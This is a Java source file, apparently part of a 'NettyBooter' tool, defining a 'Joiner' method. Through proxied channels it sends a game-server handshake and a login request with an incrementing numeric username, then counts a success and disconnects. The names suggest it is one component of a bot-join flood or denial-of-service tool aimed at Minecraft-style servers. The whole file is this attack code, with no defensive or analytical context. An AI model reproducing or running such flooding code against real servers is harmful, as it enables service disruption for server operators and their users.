package me.nzxtercode.nettybooter.methods.impl;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import me.nzxtercode.nettybooter.NettyBooter;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.packets.Handshake;
import me.nzxtercode.nettybooter.packets.LoginRequest;
import me.nzxtercode.nettybooter.proxy.ProxyManager;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Joiner.
 */
public class Joiner implements IMethod {
  private final Handshake handshake = new Handshake(NettyBooter.protocolID, NettyBooter.srvRecord, NettyBooter.port, 2);
  
  private final byte[] bytes = this.handshake.getWrappedPacket();
  
  private volatile int i = 0;
  
  public void accept(Channel channel, ProxyManager.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(String.valueOf(this.i++))).getWrappedPacket()));
    NettyBootstrap.success++;
    channel.close();
  }
}
